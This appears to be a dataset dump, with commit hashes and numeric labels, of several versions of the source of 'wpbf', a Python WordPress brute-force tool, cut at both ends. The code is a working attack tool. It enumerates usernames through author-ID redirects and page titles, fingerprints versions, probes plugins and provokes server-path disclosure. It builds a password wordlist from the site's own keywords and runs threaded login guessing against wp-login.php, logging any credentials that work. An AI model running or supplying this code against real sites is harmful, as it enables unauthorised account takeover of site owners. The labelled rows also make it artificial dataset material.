            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug(""Possible username %s (by title)"", username)
                return username
        else:
                return False

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """"""Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """"""
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split("" "")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub(""<.*?>"", """", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip("","").strip(""?"").strip('""') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """"""Check if ""Login LockDown"" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """"""
        data = self.request(self._login_url, cache=True)
        if data and ""lockdown"" in data.lower():
            return True
        else:
            return False

    def check_plugin(self, plugin):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        url = self._base_url+""wp-content/plugins/""+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False

    def find_plugins(self, url=False):
        """"""Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r""wp-content/plugins/(.*)/.*\.*\?.*[\'|\""]\w"", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug(""Possible plugins %s present"", plugins)
            return plugins
        else:
            return False

    def fingerprint(self):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name=""generator"" content=""[Ww]ord[Pp]ress (\d\.\d\.?\d?)"" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False
/n/n/n",1
78,e6f712be9793480507e5de7b2b1f82bc041dff37,"wpbf.py/n/n#!/usr/bin/env python
""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help=""worldlist file (default: ""+config.wordlist+"")"")
    parser.add_argument('-nk', '--nokeywords', action=""store_false"", help=""Don't search keywords in content and add them to the wordlist"")
    parser.add_argument('-u', '--username', default=config.username, help=""username (default: ""+str(config.username)+"")"")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help=""path to the login form (default: ""+config.script_path+"")"")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help=""how many threads the script will spawn (default: ""+str(config.threads)+"")"")
    parser.add_argument('-p', '--proxy', default=None, help=""http proxy (ex: http://localhost:8008/)"")
    parser.add_argument('-nf', '--nofingerprint', action=""store_false"", help=""Don't fingerprint WordPress"")
    parser.add_argument('-eu', '--enumerateusers', action=""store_true"", help=""Only enumerate users (withouth bruteforcing)"")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help=""User ID gap tolerance to use in username enumeration (default: ""+str(config.eu_gap_tolerance)+"")"")
    parser.add_argument('-pl', '--pluginscan', action=""store_true"", help=""Detect plugins in WordPress using a list of popular/vulnerable plugins"")
    parser.add_argument('--test', action=""store_true"", help=""Run python doctests (you can use a dummy URL here)"")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig(""logging.conf"")
    logger = logging.getLogger(""wpbf"")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info(""Target URL: %s"", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info(""Checking URL & username..."")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info(""Enumerating users..."")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info(""Usernames: %s"", "", "".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error(""Can't find usernames :("")
    except urllib2.HTTPError:
        logger.error(""HTTP Error on: %s"", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error(""URL Error on: %s"", wp.get_login_url())
        if config.proxy:
            logger.info(""Check if proxy is well configured and running"")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint tasks into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, ""r"").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins() if plugin]
        logger.info(""%s plugins will be tested"", str(len(plugins_list)))
        for plugin in plugins_list:
            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug(""Checking for Login LockDown plugin"")
    if wp.check_loginlockdown():
        logger.warning(""Login LockDown plugin is active, bruteforce will be useless"")
    else:
        # load login check tasks into queue
        logger.debug(""Loading wordlist..."")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, ""r"").readlines()]
        except IOError:
            logger.error(""Can't open '%s' the wordlist will not be used!"", config.wordlist)
        logger.debug(""%s words loaded from %s"", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info(""%s passwords will be tested"", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info(""Starting workers..."")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+"" tasks left / ""+str(round(1 / wps, 2))+"" tasks per second / ""+str( round(wps*current_queue / 60, 2) )+""min left""
        except KeyboardInterrupt:
            logger.info(""Clearing queue and killing threads..."")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()
/n/n/nwplib.py/n/n""""""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
""""""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """"""Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """"""
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """""" Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain(""www.dominio.com.ar"")
    'dominio'
    """"""
    words = ["".com"", ""www."", "".ar"", "".cl"", "".py"", "".org"", "".net"", "".mx"", "".bo"", "".gob"", "".gov"", "".edu""]
    for word in words:
        domain = domain.replace(word, """")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """"""Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """"""
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """"""Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """"""
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path=""wp-login.php"", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip(""/"")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger(""wpbf"")

    # Getters

    def get_login_url(self):
        """"""Returns login URL""""""
        return self._login_url

    def get_base_url(self):
        """"""Returns base URL""""""
        return self._base_url

    def get_version(self):
        """"""Returns WordPress version""""""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """"""Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """"""
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug(""Cached %s %s"", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug(""Requesting %s %s"", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """"""Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data or ""incorrect"" in data.lower():
                return False
            return True
        return False

    def check_username(self, username):
        """"""Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data:
                if ""usuario es incorrecto"" in data or 'usuario no' in data or ""Invalid username"" in data:
                    return False
                return True
        return False

    def find_username(self, url=False):
        """"""Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)""',
            '/author/(.*?)/feed',
            'entries of (.*)""',
            'by (.*) Feed""',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)""',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug(""regexp %s marched %s"", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace(""/"","""")
            self.logger.debug(""Possible username %s (by content)"", username)
            return username
        else:
            return False

    def enumerate_usernames(self, gap_tolerance=0):
        """"""Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """"""
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+""?author=""+str(uid)
                request = urllib2.Request(url)
                request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({""http"": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug(""Requesting %s"", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is ""/"":
                        username = response_path.split(""/"")[-2]
                    else:
                        username = response_path.split(""/"")[-1]
                    self.logger.debug(""Possible username %s (by redirect)"", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """"""Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """"""
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search(""<title>(.*)</title>"", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug(""Possible username %s (by title)"", username)
                return username
        else:
                return False

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """"""Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """"""
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split("" "")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub(""<.*?>"", """", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip("","").strip(""?"").strip('""') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """"""Check if ""Login LockDown"" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """"""
        data = self.request(self._login_url, cache=True)
        if data and ""lockdown"" in data.lower():
            return True
        else:
            return False

    def check_plugin(self, plugin):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        url = self._base_url+""wp-content/plugins/""+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False

    def find_plugins(self, url=False):
        """"""Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r""wp-content/plugins/(.*)/.*\.*\?.*[\'|\""]\w"", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug(""Possible plugins %s present"", plugins)
            return plugins
        else:
            return []

    def find_server_path(self):
        path = False
        urls = ['wp-settings.php', 'wp-content/plugins/akismet/akismet.php', 'wp-content/plugins/hello.php']

        for url in urls:
            response = self.request(self._base_url+url)
            if response and 'Fatal error' in response:
                if url in response:
                    match = ' <b>(.*)'+url+'</b>'
                    path_disclosure = re.search(match, response, re.IGNORECASE)
                    if path_disclosure:
                        return path_disclosure.group(1)

        return False

    def fingerprint(self):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name=""generator"" content=""[Ww]ord[Pp]ress (\d\.\d\.?\d?)"" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False
/n/n/nwpworker.py/n/n""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import threading

from wplib import Wp

class WpbfWorker(threading.Thread):
    """"""Handle threads that consume the tasks queue""""""
    def __init__(self, task_queue):
        threading.Thread.__init__(self)
        self._queue = task_queue

    def run(self):
        while self._queue.qsize() > 0:
            try:
                task = self._queue.get()
                task.run()
                self._queue.task_done()
            except WpTaskStop:
                self._queue.queue.clear()

class WpTask():
    """"""Base task class""""""

    _task_queue = False
    _requeue = False

    def run(self):
        pass

    def stop_all_tasks(self):
        raise WpTaskStop

    def requeue(self):
        """"""Requeue a task""""""
        if self._requeue and self._keywords.has_key('task_queue'):
            self._task_queue = self._keywords['task_queue']
            self._task_queue.put(self)
            self._requeue = False
            return True
        return False

class WpTaskStop(Exception):
    """"""Clear tasks queue""""""
    def __str__(self):
        return 'Stop all tasks!'

class WpTaskFingerprint(Wp, WpTask):
    """"""Perform WordPress fingerprint and. If positive, log the results""""""
    def run(self):
        self.logger.info(""WordPress version: %s"", self.fingerprint())
        server_path = self.find_server_path()
        if server_path:
            self.logger.info(""WordPress path in server: %s"", self.find_server_path())

class WpTaskLogin(Wp, WpTask):
    """"""
    Perform WordPress login. If login is positive, will log the username and password combination

    username -- string representing a username
    password -- string representing a password
    """"""
    def run(self):
        if self._keywords.has_key('username') and self._keywords.has_key('password') and self.login(self._keywords['username'], self._keywords['password']):
            # username and password found: log data and stop all tasks
            self.logger.info(""Password '%s' found for username '%s' on %s"", self._keywords['password'], self._keywords['username'], self.get_login_url())
            self.stop_all_tasks()

class WpTaskPluginCheck(Wp, WpTask):
    """"""
    Check if a plugin exists. If not 404 error is found and request is completed, the
    plugin name will be logged

    name -- string representing the plugin name/directory
    """"""
    def run(self):
        if self._keywords.has_key('name') and self.check_plugin(self._keywords['name']):
            self.logger.info(""Plugin '%s' was found"", self._keywords['name'])
/n/n/n",0
79,e6f712be9793480507e5de7b2b1f82bc041dff37,"/wpbf.py/n/n#!/usr/bin/env python
""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help=""worldlist file (default: ""+config.wordlist+"")"")
    parser.add_argument('-nk', '--nokeywords', action=""store_false"", help=""Don't search keywords in content and add them to the wordlist"")
    parser.add_argument('-u', '--username', default=config.username, help=""username (default: ""+str(config.username)+"")"")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help=""path to the login form (default: ""+config.script_path+"")"")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help=""how many threads the script will spawn (default: ""+str(config.threads)+"")"")
    parser.add_argument('-p', '--proxy', default=None, help=""http proxy (ex: http://localhost:8008/)"")
    parser.add_argument('-nf', '--nofingerprint', action=""store_false"", help=""Don't fingerprint WordPress"")
    parser.add_argument('-eu', '--enumerateusers', action=""store_true"", help=""Only enumerate users (withouth bruteforcing)"")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help=""User ID gap tolerance to use in username enumeration (default: ""+str(config.eu_gap_tolerance)+"")"")
    parser.add_argument('-pl', '--pluginscan', action=""store_true"", help=""Detect plugins in WordPress using a list of popular/vulnerable plugins"")
    parser.add_argument('--test', action=""store_true"", help=""Run python doctests (you can use a dummy URL here)"")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig(""logging.conf"")
    logger = logging.getLogger(""wpbf"")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info(""Target URL: %s"", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info(""Checking URL & username..."")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info(""Enumerating users..."")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info(""Usernames: %s"", "", "".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error(""Can't find usernames :("")
    except urllib2.HTTPError:
        logger.error(""HTTP Error on: %s"", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error(""URL Error on: %s"", wp.get_login_url())
        if config.proxy:
            logger.info(""Check if proxy is well configured and running"")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint task into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, ""r"").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins()]
        logger.info(""%s plugins will be tested"", str(len(plugins_list)))
        for plugin in plugins_list:
            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug(""Checking for Login LockDown plugin"")
    if wp.check_loginlockdown():
        logger.warning(""Login LockDown plugin is active, bruteforce will be useless"")
    else:
        # load login check tasks into queue
        logger.debug(""Loading wordlist..."")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, ""r"").readlines()]
        except IOError:
            logger.error(""Can't open '%s' the wordlist will not be used!"", config.wordlist)
        logger.debug(""%s words loaded from %s"", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info(""%s passwords will be tested"", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info(""Starting workers..."")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+"" tasks left / ""+str(round(1 / wps, 2))+"" tasks per second / ""+str( round(wps*current_queue / 60, 2) )+""min left""
        except KeyboardInterrupt:
            logger.info(""Clearing queue and killing threads..."")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()
/n/n/n/wplib.py/n/n""""""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
""""""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """"""Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """"""
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """""" Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain(""www.dominio.com.ar"")
    'dominio'
    """"""
    words = ["".com"", ""www."", "".ar"", "".cl"", "".py"", "".org"", "".net"", "".mx"", "".bo"", "".gob"", "".gov"", "".edu""]
    for word in words:
        domain = domain.replace(word, """")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """"""Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """"""
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """"""Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """"""
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path=""wp-login.php"", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip(""/"")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger(""wpbf"")

    # Getters

    def get_login_url(self):
        """"""Returns login URL""""""
        return self._login_url

    def get_base_url(self):
        """"""Returns base URL""""""
        return self._base_url

    def get_version(self):
        """"""Returns WordPress version""""""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
